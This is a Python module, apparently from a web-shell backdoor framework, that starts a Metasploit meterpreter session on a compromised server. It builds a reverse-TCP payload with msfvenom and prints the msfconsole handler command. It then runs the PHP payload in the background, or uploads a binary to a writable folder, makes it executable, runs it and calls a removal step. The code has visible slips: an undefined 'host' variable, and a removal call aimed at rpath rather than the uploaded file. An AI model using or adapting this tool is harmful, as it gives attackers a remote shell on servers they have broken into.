from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module, Status
from core.loggers import log
from core import messages
from distutils import spawn
import os
import tempfile
import subprocess

class Meterpreter(Module):

    """Start a meterpreter session."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
          { 'name' : '-msfvenom-path', 'help' : 'Msvenom command', 'default': 'msfvenom' },
          { 'name' : '-payload', 'help' : 'Msfconsole command', 'default': 'php/meterpreter/reverse_tcp' },
          { 'name' : '-host', 'help' : 'Remote host' },
          { 'name' : '-lhost', 'help' : 'Local host' },
          { 'name' : '-port', 'help' : 'Port', 'default' : '4444' },
          { 'name' : '-rpath', 'help' : 'Upload non PHP payloads in the first writable folder starting from rpath', 'default' : '.' },
          ])

    def run(self):

        # Check msfvenom existance
        msvenom_path = spawn.find_executable(
                    self.args['msfvenom_path']
                )

        if not msvenom_path:
            log.error(
                messages.module_backdoor_metasploit.msfvenom_s_not_found % self.args['msfvenom_path']
            )
            return
    
        # Set options according to the payload type
        options = []
        if 'reverse' in self.args['payload']:
            
            lhost = self.args.get('lhost')
            if not lhost:
                log.error(
                    messages.module_backdoor_metasploit.error_payload_s_requires_lhost % self.args['payload']
                    )
                return
            else:
                options += [ ( 'LHOST', lhost ) ]
                
        else:
            options += [ ( 'RHOST', host ) ]
                
        options += [ ( 'PORT', self.args.get('port') ) ]

        log.warn(messages.module_backdoor_metasploit.make_sure_run_msfconsole)
        log.info(
            'msfconsole -x "use exploit/multi/handler; set PAYLOAD %s; %s run"' % (
                self.args['payload'],
                ' '.join([ "set %s %s;" % (f, v) for f, v in options ])
            )    
        )

        # Get temporary file name
        local_file = tempfile.NamedTemporaryFile()
        local_path = local_file.name
    
        # Build argument list for msfvenom
        arguments_list = [ 
            msvenom_path, 
            '-p', self.args['payload'],
            '-o', local_path 
        ] + [ '%s=%s' % (v, f) for v, f in options ]
        
        # Add executable format to the argument list
        if self.args['payload'].startswith('linux/'):
            arguments_list += [ '-f', 'elf' ]
        elif self.args['payload'].startswith('windows/'):
            arguments_list += [ '-f', 'exe' ]
            
        log.debug(' '.join(arguments_list))
    
        # Generate meterpreter PHP code
        agent = ''
        status = 0
        try:
            subprocess.check_call(
                arguments_list,
                stderr=open('/dev/null', 'w')
            )
            agent = open(local_path, 'r').read()
        except subprocess.CalledProcessError as e:
            status = e.returncode
        except Exception as e:
            log.debug(str(e))
            status = -1

        if status or not agent:
            log.error(
                messages.module_backdoor_metasploit.error_generating_payload
            )
            return
        
        if self.args['payload'].startswith('php/'):
            # If PHP payload, just run it
            
            PhpCode(agent, background = True).run()
        else:
            
            if self.session['shell_sh']['status'] != Status.RUN:
                log.error(
                    messages.module_backdoor_metasploit.error_payload_s_requires_shell_use_php % self.args['payload']
                )
                return
            
            # Else: upload, execute, remove
            
            folders = ModuleExec(
                "file_find", 
                [ 
                    '-writable', 
                    '-quit', 
                    '-ftype', 'd', 
                    self.args['rpath']
                ]
            ).run()

            if not folders or not folders[0]:
                log.error(messages.module_backdoor_metasploit.error_searching_writable_folder_under_s % (self.args['rpath']))
                return 
            
            local_filename = os.path.basename(local_path)
            
            remote_path = os.path.join(folders[0], local_filename)
            
            ModuleExec(
                "file_upload", 
                [ 
                    local_path,
                    remote_path
                ]
            ).run()
            
            # Let the uploaded file executable
            ShellCmd("chmod +x %s" % (remote_path)).run()
            
            # Execute the payload in background
            ShellCmd(remote_path, background = True).run()
            
            ModuleExec(
                "file_rm", 
                [ 
                    self.args['rpath']
                ]
            ).run()